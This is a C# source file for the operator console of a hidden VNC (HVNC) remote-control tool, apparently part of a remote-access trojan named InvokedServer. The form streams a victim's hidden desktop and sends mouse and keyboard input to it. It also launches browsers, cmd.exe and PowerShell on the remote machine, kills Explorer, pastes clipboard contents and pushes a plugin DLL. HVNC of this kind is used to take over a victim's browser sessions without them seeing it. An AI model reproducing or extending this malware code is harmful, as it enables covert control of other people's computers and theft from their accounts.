

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using InvokedCommon.Messages;
using InvokedCommon.Structs;
using InvokedServer.DataStructs;
using InvokedServer.Enums;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;
using InvokedServer.Utilities;


namespace InvokedServer.Forms
{
	public partial class FrmHVNC : Form
	{
		private bool DidLoadPlugin;
		private string _windowname = "HVNC";
		private bool _enableMouseInput = true;
		private bool _enableKeyboardInput = true;
		private readonly Client _connectClient;
		private readonly HVNCHandler _HVNCHandler;
		private static readonly Dictionary<Client, FrmHVNC> OpenedForms = new Dictionary<Client, FrmHVNC>();

		protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
		{
			this.hvncPictureBox1.TriggerWndProc(ref msg);
			return true;
		}

		public static FrmHVNC CreateNewOrGetExisting(Client client)
		{
			if (FrmHVNC.OpenedForms.ContainsKey(client))
				return FrmHVNC.OpenedForms[client];
			FrmHVNC newOrGetExisting = new FrmHVNC(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmHVNC.OpenedForms.Remove(client));
			FrmHVNC.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmHVNC(Client client)
		{
			this._connectClient = client;
			this._HVNCHandler = new HVNCHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
			this.hvncPictureBox1.SetHandler(this._HVNCHandler);
			this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient) + " *Client Disconnected*";
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._HVNCHandler.ProgressChanged += new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._HVNCHandler.NewImageDataUpdate += new HVNCHandler.MessegeSizeHandler(this.UpdateImageDataLabels);
			this._HVNCHandler.PluginStatusChanged += new HVNCHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			MessageHandler.Register((IMessageProcessor)this._HVNCHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._HVNCHandler);
			this._HVNCHandler.ProgressChanged -= new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._HVNCHandler.NewImageDataUpdate -= new HVNCHandler.MessegeSizeHandler(this.UpdateImageDataLabels);
			this._HVNCHandler.PluginStatusChanged -= new HVNCHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void StartStream()
		{
			this.ToggleConfigurationControls(true);
			this.hvncPictureBox1.Start();
			this.hvncPictureBox1.SetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.hvncPictureBox1;
			this._HVNCHandler.BeginReceiveFrames(this.barQuality.Value);
			if (!this.AutoExplorerCheckbox.Enabled || !this.AutoExplorerCheckbox.Checked)
				return;
			this._HVNCHandler.StartProcess(null, "StartExplorer");
		}

		private void StopStream()
		{
			this.ToggleConfigurationControls(false);
			this.hvncPictureBox1.Stop();
			this.hvncPictureBox1.UnsetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.hvncPictureBox1;
			this._HVNCHandler.EndReceiveFrames();
		}

		private void ToggleConfigurationControls(bool started)
		{
			this.btnStart.Enabled = !started;
			this.btnStop.Enabled = started;
			this.barQuality.Enabled = !started;
			this.OldGraphicsEngineToolStripMenuItem.Enabled = !started;
		}

		private void TogglePanelVisibility(bool visible)
		{
			this.panelTop.Visible = visible;
			this.btnShow.Visible = !visible;
			this.ActiveControl = (Control)this.hvncPictureBox1;
			this.OnResize(EventArgs.Empty);
		}

		public void UpdateImageDataLabels(object sender, HVNCImageDataStruct data)
		{
			this.SizeLabel.Text = "Size: " + data.sizeText;
			this.WindowLabel.Text = "Windows: " + data.windowCount.ToString();
		}

		private void PluginStatusChanged(object sender, PluginStatus status)
		{
			switch (status)
			{
				case PluginStatus.Loaded:
					this.PluginLabel.ForeColor = Color.LightGreen;
					this.PluginLabel.Text = "Plugin is ready!";
					if (!this.DidLoadPlugin)
					{
						this.PluginLabel.Visible = false;
						break;
					}
					break;
				case PluginStatus.Installing:
					this.PluginLabel.ForeColor = Color.DeepSkyBlue;
					this.PluginLabel.Text = "Sending the Plugin for the first time, please wait..";
					this.DidLoadPlugin = true;
					break;
				case PluginStatus.PluginFileNotFound:
					this.PluginLabel.ForeColor = Color.Red;
					this.PluginLabel.Text = "Error: Cannot find the Plugin dll in Plugins folder!";
					break;
			}
			this.OnResize(EventArgs.Empty);
		}

		private void UpdateImage(object sender, Bitmap bmp)
		{
			try
			{
				this.hvncPictureBox1.UpdateImage(bmp, false);
			}
			catch
			{
			}
		}

		private void FrmHVNC_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient);
			this.OnResize(EventArgs.Empty);
			this._HVNCHandler.CheckPluginStatus();
		}

		private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
		{
			this.Text = string.Format("{0} - FPS: {1}", (object)WindowHelper.GetWindowTitle(this._windowname, this._connectClient), (object)e.CurrentFramesPerSecond.ToString("0.00"));
		}

		private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this._HVNCHandler.IsStarted)
				this.StopStream();
			this.UnregisterMessageHandler();
			this._HVNCHandler.Dispose();
			this.hvncPictureBox1.Image?.Dispose();
		}

		private void FrmHVNC_Resize(object sender, EventArgs e)
		{
			if (this.WindowState == FormWindowState.Minimized)
				return;
			this._HVNCHandler.LocalResolution = this.hvncPictureBox1.Size;
			this.btnShow.Left = (this.Width - this.btnShow.Width) / 2;
			this.PluginLabel.Left = (this.Width - this.PluginLabel.Width) / 2;
			if (this.Size.Width > 830)
				this.SizeLabel.Visible = true;
			else
				this.SizeLabel.Visible = false;
			Size size = this.Size;
			if (size.Width > 970)
				this.WindowLabel.Visible = true;
			else
				this.WindowLabel.Visible = false;
			if (this.btnExit.Visible)
			{
				if (this.btnShow.Visible)
				{
					this.btnExit.Top = this.panelTop.Top;
					this.btnShow.Left = (this.Width - this.btnShow.Width - this.btnShow.Width) / 2;
					this.btnExit.Left = this.btnShow.Left + this.btnShow.Width + 3;
				}
				else
				{
					this.btnExit.Top = this.panelTop.Bottom;
					this.btnExit.Left = (this.Width - this.btnExit.Width) / 2;
				}
				this.ActiveControl = (Control)this.btnExit;
			}
			int num = 363;
			size = this.ClientSize;
			this.GraphicPictureBox.Width = size.Width - 381 - num;
			this.GraphicPictureBox.Left = num;
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			this.StartStream();
			this.AutoExplorerCheckbox.Checked = false;
			this.PluginLabel.Visible = false;
		}

		private void btnStop_Click(object sender, EventArgs e) => this.StopStream();

		private void barQuality_Scroll(object sender, EventArgs e)
		{
			int num = this.barQuality.Value;
			this.lblQualityShow.Text = num.ToString();
			if (num < 25)
				this.lblQualityShow.Text += " (low)";
			else if (num >= 85)
				this.lblQualityShow.Text += " (best)";
			else if (num >= 75)
				this.lblQualityShow.Text += " (high)";
			else if (num >= 25)
				this.lblQualityShow.Text += " (mid)";
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnMouse_Click(object sender, EventArgs e)
		{
			if (this._enableMouseInput)
			{
				this.hvncPictureBox1.Cursor = Cursors.Default;
				this.btnMouse.Image = (Image)Resources.mouse_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Enable mouse input.");
				this._enableMouseInput = false;
				this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			}
			else
			{
				this.hvncPictureBox1.Cursor = Cursors.Hand;
				this.btnMouse.Image = (Image)Resources.mouse_add;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Disable mouse input.");
				this._enableMouseInput = true;
				this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			}
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this._enableKeyboardInput)
			{
				this.hvncPictureBox1.Cursor = Cursors.Default;
				this.btnKeyboard.Image = (Image)Resources.keyboard_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Enable keyboard input.");
				this._enableKeyboardInput = false;
				this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
			}
			else
			{
				this.hvncPictureBox1.Cursor = Cursors.Hand;
				this.btnKeyboard.Image = (Image)Resources.keyboard_add;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Disable keyboard input.");
				this._enableKeyboardInput = true;
				this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
			}
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnHide_Click(object sender, EventArgs e) => this.TogglePanelVisibility(false);

		private void btnShow_Click(object sender, EventArgs e) => this.TogglePanelVisibility(true);

		private void MoveWindowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.DoOption(HvncOptions.ResetAllWindows);
		}

		private void ExtrasBtn_Click(object sender, EventArgs e)
		{
			Guna2GradientButton guna2GradientButton = (Guna2GradientButton)sender;
			Point p = new Point(0, guna2GradientButton.Height);
			this.ExtrasContextMenuStrip.Show(guna2GradientButton.PointToScreen(p));
		}

		private void ProgramsListBtn_Click(object sender, EventArgs e)
		{
			Guna2GradientButton guna2GradientButton = (Guna2GradientButton)sender;
			Point p = new Point(0, guna2GradientButton.Height);
			this.ProgramsContextMenuStrip.Show(guna2GradientButton.PointToScreen(p));
		}

		private void EdgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartEdge");
		}

		private void ChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartChrome");
		}

		private void FirefoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartFirefox");
		}

		private void BraveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartBrave");
		}

		private void OperaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartOpera");
		}

		private void OperaGxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartOperaGX");
		}

		private void CmdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Windows\\System32\\cmd.exe");
		}

		private void PowershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
		}

		private void ExplorerBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartExplorer");
		}

		private void killExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.DoOption(HvncOptions.KillExplorer);
		}

		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.DoOption(HvncOptions.PasteClipboard);
		}

		private void clientPasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.DoOption(HvncOptions.PasteClientClipboard);
		}

		private void fullScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.btnExit.Visible = true;
			this.FormBorderStyle = FormBorderStyle.None;
			this.WindowState = FormWindowState.Normal;
			this.WindowState = FormWindowState.Maximized;
		}

		private void hideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.TogglePanelVisibility(false);
		}

		private void btnExit_Click(object sender, EventArgs e)
		{
			this.FormBorderStyle = FormBorderStyle.Sizable;
			this.WindowState = FormWindowState.Normal;
			this.btnExit.Visible = false;
		}

		private void CapFPSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.hvncPictureBox1.CapFPS = this.CapFPSToolStripMenuItem.Checked;
		}

		private void FixOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.DoOption(HvncOptions.FixOpera);
		}

		private void OldGraphicsEngineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.SetOldGraphicsEngine(this.OldGraphicsEngineToolStripMenuItem.Checked);
		}

		private void BrowserMenuToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FrmHVNCBrowserOptions hvncBrowserOptions = new FrmHVNCBrowserOptions(this._connectClient))
			{
				hvncBrowserOptions.ShowDialog();
			}
		}
	}
}
